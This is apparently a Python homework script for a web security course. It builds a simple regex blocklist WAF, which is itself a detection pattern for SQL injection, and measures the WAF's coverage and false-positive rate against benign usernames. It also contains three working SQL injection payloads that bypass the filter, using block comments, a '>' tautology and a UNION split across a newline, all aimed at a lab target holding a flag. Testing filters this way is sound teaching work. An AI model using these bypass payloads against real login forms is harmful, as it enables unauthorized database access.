import json
import re
from pathlib import Path

from homework.hw2.flores.attack.attack import SQLI_PAYLOADS
from homework.hw2.flores.webharness import login_send
from seclab.attack import Payload, contains_oracle, print_summary, run_payloads

BLOCKLIST_PATTERNS = [
    re.compile(r"--"),  # SQL line comment
    re.compile(r"\bunion\b.{0,20}\bselect\b", re.IGNORECASE),  # union dump
    re.compile(r"\bor\b.{0,10}=", re.IGNORECASE),  # OR-based tautology
]


def is_blocked(user_payload: str) -> bool:
    return any(p.search(user_payload) for p in BLOCKLIST_PATTERNS)


def login_send_waf(user_payload: str) -> str:
    if is_blocked(user_payload):
        return json.dumps({"blocked": True, "reason": "waf-blocklist"})
    return login_send(user_payload)


def waf_blocked_oracle(payload, response):
    try:
        data = json.loads(response)
    except (ValueError, TypeError):
        return False, "response was not JSON"
    blocked = data.get("blocked") is True
    return blocked, (
        "request never reached the app" if blocked else "request passed the filter"
    )


def confirm_coverage():
    return run_payloads(SQLI_PAYLOADS, send=login_send_waf, oracle=waf_blocked_oracle)


BYPASS_PAYLOADS = [
    Payload(
        "admin' /*", intent="string-terminate via block comment", family="sqli-bypass"
    ),
    Payload(
        "' OR 1>0 /*", intent="tautology using > instead of =", family="sqli-bypass"
    ),
    # Same intent as the UNION dump: a literal newline between UNION and
    # SELECT defeats the rule's single-line "{0,20} chars, no newline"
    Payload(
        "x' UNION\nSELECT user, secret FROM users /*",
        intent="union/select split across a newline",
        family="sqli-bypass",
    ),
]


def confirm_bypass():
    return run_payloads(
        BYPASS_PAYLOADS, send=login_send_waf, oracle=contains_oracle("FLAG-sqli-")
    )


# Our own hand-written benign cases: plausible usernames that happen to trip
# the blocklist's specific syntax (a double-hyphen typo, an `or ... =` fragment).
INVENTED_BENIGN_CORPUS = [
    "alice",
    "bob.smith",
    "o'connor",
    "mary-jane",
    "anita--jones",
    "jose.garcia@example.com",
    "x.ae.a-12",
    "jean.d'arc",
    "newuser2024",
    "support_team",
    "editor",
    "sensor_42",
    "the doctor",
    "pastor.john",
    "name or id=1",
    "o'brien--legacy",
]

_PROVIDED_GROUPS = ("login_username", "search_or_name")


def _find_root() -> Path:
    root = Path(__file__).resolve()
    while root != root.parent and not (root / "seclab").is_dir():
        root = root.parent
    return root


def load_provided_benign_corpus() -> list[tuple[str, str]]:
    path = _find_root() / "homework" / "hw2" / "duel-2-web" / "benign_traffic.json"
    data = json.loads(path.read_text())
    return [(text, group) for group in _PROVIDED_GROUPS for text in data.get(group, [])]


def build_benign_corpus() -> list[Payload]:
    payloads = [
        Payload(u, intent="benign: invented", family="benign")
        for u in INVENTED_BENIGN_CORPUS
    ]
    payloads += [
        Payload(text, intent=f"benign: provided/{group}", family="benign")
        for text, group in load_provided_benign_corpus()
    ]
    return payloads


def confirm_benign_corpus():
    return run_payloads(
        build_benign_corpus(), send=login_send_waf, oracle=waf_blocked_oracle
    )


def false_positive_rate(findings) -> tuple[float, list[str]]:
    blocked = [
        f"{f.payload.text!r} [{f.payload.intent}]" for f in findings if f.confirmed
    ]
    return len(blocked) / len(findings), blocked


def false_positive_breakdown(findings) -> dict[str, dict]:
    by_source: dict[str, dict] = {}
    for f in findings:
        src = f.payload.intent
        bucket = by_source.setdefault(src, {"tried": 0, "blocked": 0, "examples": []})
        bucket["tried"] += 1
        if f.confirmed:
            bucket["blocked"] += 1
            bucket["examples"].append(f.payload.text)
    for bucket in by_source.values():
        bucket["rate"] = bucket["blocked"] / bucket["tried"]
    return by_source


if __name__ == "__main__":
    print("== B1 coverage: Part-A SQLi payloads vs. the WAF ==")
    print_summary(confirm_coverage())

    print("\n== B1 bypass: same-intent payloads that evade the WAF ==")
    print_summary(confirm_bypass())

    print("\n== B1 false positives: benign corpus vs. the WAF ==")
    fp_findings = confirm_benign_corpus()
    rate, blocked = false_positive_rate(fp_findings)
    print(f"combined FP rate: {rate:.1%} ({len(blocked)}/{len(fp_findings)})")
    print("\nper-source breakdown (the honest view):")
    for src, b in sorted(false_positive_breakdown(fp_findings).items()):
        ex = f"  e.g. {b['examples']}" if b["examples"] else ""
        print(f"  {src:<34} {b['blocked']:>2}/{b['tried']:<2} = {b['rate']:>5.1%}{ex}")
